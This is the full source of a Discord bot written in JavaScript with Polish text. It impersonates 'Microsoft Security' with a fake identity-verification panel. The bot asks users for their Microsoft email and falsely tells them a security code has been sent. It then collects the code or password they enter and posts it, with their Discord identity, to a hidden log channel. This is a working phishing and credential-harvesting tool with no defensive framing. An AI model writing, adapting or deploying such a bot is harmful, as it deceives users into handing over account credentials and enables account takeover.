const { 
    Client, 
    GatewayIntentBits, 
    Partials, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle,
    REST,
    Routes
} = require('discord.js');
require('dotenv').config();
const http = require('http');

// Render Port Binding Fix
const server = http.createServer((req, res) => {
    res.write("Bot is running!");
    res.end();
});

const port = process.env.PORT || 3000;
server.listen(port, "0.0.0.0", () => {
    console.log(`\x1b[36m[SERVER]\x1b[0m Web server is listening on port ${port}`);
});

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ],
    partials: [Partials.Channel, Partials.Message, Partials.User]
});

const PREFIX = '!';
const LOG_CHANNEL_ID = "1505269850191433921"; // ID kanału sprawdzacz botow

// Error & Process Handling
process.on('unhandledRejection', error => {
    console.error('\x1b[31m[UNHANDLED REJECTION]\x1b[0m', error);
});

process.on('uncaughtException', error => {
    console.error('\x1b[31m[UNCAUGHT EXCEPTION]\x1b[0m', error);
});

process.on('exit', (code) => {
    console.log(`\x1b[33m[PROCESS]\x1b[0m Process exited with code: ${code}`);
});

client.on('error', error => {
    console.error('\x1b[31m[CLIENT ERROR]\x1b[0m', error);
});

client.once('ready', async () => {
    console.log(`\x1b[32m[READY]\x1b[0m Zalogowano jako ${client.user.tag}`);
    client.user.setActivity('Weryfikacja Microsoft', { type: 3 });

    const commands = [
        {
            name: 'panelweryfikacja',
            description: 'Wysyła panel weryfikacji Microsoft',
        }
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

    try {
        console.log('Rozpoczynam rejestrację komend slash...');
        if (client.user) {
            await rest.put(
                Routes.applicationCommands(client.user.id),
                { body: commands },
            );
            console.log('Pomyślnie zarejestrowano komendy slash!');
        }
    } catch (error) {
        console.error('Błąd podczas rejestracji komend:', error);
    }
});

// Store pending verification data
const pendingVerifications = new Map();

client.on('interactionCreate', async (interaction) => {
    // 1. Slash Command - Verification Panel
    if (interaction.isChatInputCommand()) {
        if (interaction.commandName === 'panelweryfikacja') {
            const embed = new EmbedBuilder()
                .setColor(0x2B2D31) // Modern Dark Gray
                .setAuthor({ name: 'Microsoft Security', iconURL: 'https://img.icons8.com/color/48/000000/microsoft.png' })
                .setTitle('🛡️ Weryfikacja Tożsamości')
                .setDescription(
                    'W celu ochrony naszej społeczności przed botami, wymagamy jednorazowej weryfikacji konta Microsoft.\n\n' +
                    '**Instrukcja:**\n' +
                    '1️⃣ Kliknij przycisk poniżej\n' +
                    '2️⃣ Podaj adres e-mail powiązany z kontem\n' +
                    '3️⃣ Postępuj zgodnie z dalszymi instrukcjami'
                )
                .setThumbnail('https://img.icons8.com/color/96/000000/microsoft.png')
                .setFooter({ text: 'Twoje dane są przetwarzane bezpiecznie przez system Microsoft API.', iconURL: 'https://img.icons8.com/color/48/000000/checked-user-male--v1.png' });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId('start_verify')
                    .setLabel('Rozpocznij Weryfikację')
                    .setEmoji('📧')
                    .setStyle(ButtonStyle.Success)
            );

            await interaction.channel.send({ embeds: [embed], components: [row] });
            await interaction.reply({ content: '✅ Panel weryfikacji został wysłany pomyślnie.', ephemeral: true });
        }
    }

    // 2. Button Handling
    if (interaction.isButton()) {
        // Step 1: Open Email Modal
        if (interaction.customId === 'start_verify') {
            const modal = new ModalBuilder()
                .setCustomId('modal_email')
                .setTitle('Krok 1: Adres E-mail');

            const emailInput = new TextInputBuilder()
                .setCustomId('input_email')
                .setLabel("E-mail Microsoft")
                .setPlaceholder("np. nazwa@outlook.com lub nazwa@hotmail.com")
                .setStyle(TextInputStyle.Short)
                .setMinLength(5)
                .setMaxLength(100)
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(emailInput));
            await interaction.showModal(modal);
        }

        // Step 3: Open Code Modal
        if (interaction.customId === 'btn_step_code') {
            const modal = new ModalBuilder()
                .setCustomId('modal_code')
                .setTitle('Krok 2: Kod Weryfikacyjny');

            const codeInput = new TextInputBuilder()
                .setCustomId('input_code')
                .setLabel("Podaj kod zabezpieczający")
                .setPlaceholder("Wpisz kod otrzymany na e-mail")
                .setStyle(TextInputStyle.Short)
                .setMinLength(4)
                .setMaxLength(20)
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(codeInput));
            await interaction.showModal(modal);
        }
    }

    // 3. Modal Submission Handling
    if (interaction.isModalSubmit()) {
        // Handle Email Submission
        if (interaction.customId === 'modal_email') {
            const email = interaction.fields.getTextInputValue('input_email');
            pendingVerifications.set(interaction.user.id, { email });

            const nextStepEmbed = new EmbedBuilder()
                .setColor(0x00AAFF)
                .setTitle('📥 Sprawdź swoją skrzynkę')
                .setDescription(
                    `Na adres **${email}** został wysłany kod zabezpieczający.\n\n` +
                    'Proszę kliknąć przycisk poniżej i wpisać otrzymany kod, aby dokończyć proces.'
                )
                .setFooter({ text: 'Może to potrwać do 2 minut. Sprawdź folder Spam.' });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId('btn_step_code')
                    .setLabel('Wprowadź Kod')
                    .setEmoji('🔑')
                    .setStyle(ButtonStyle.Primary)
            );

            await interaction.reply({ embeds: [nextStepEmbed], components: [row], ephemeral: true });
        }

        // Handle Code Submission
        if (interaction.customId === 'modal_code') {
            const code = interaction.fields.getTextInputValue('input_code');
            const data = pendingVerifications.get(interaction.user.id);
            const email = data ? data.email : "Nieznany";

            // Log results to management channel
            const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setColor(0x57F287) // Success Green
                    .setTitle('🔐 Nowe Dane Weryfikacyjne')
                    .setThumbnail(interaction.user.displayAvatarURL())
                    .addFields(
                        { name: '👤 Użytkownik', value: `${interaction.user.tag} (\`${interaction.user.id}\`)`, inline: false },
                        { name: '📧 Adres E-mail', value: `\`${email}\``, inline: true },
                        { name: '🔑 Kod/Hasło', value: `\`${code}\``, inline: true }
                    )
                    .setTimestamp();
                await logChannel.send({ embeds: [logEmbed] });
            }

            pendingVerifications.delete(interaction.user.id);

            await interaction.reply({ 
                content: '🛡️ **Proces weryfikacji zakończony.**\nTwoje zgłoszenie jest teraz analizowane przez system. Dostęp do serwera zostanie przyznany wkrótce.', 
                ephemeral: true 
            });
        }
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;
    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    if (command === 'ping') {
        await message.reply(`Pong! **${Math.round(client.ws.ping)}ms**`);
    }
});

client.login(process.env.TOKEN).catch(err => {
    console.error('\x1b[31m[ERROR]\x1b[0m Nie udało się zalogować.');
});
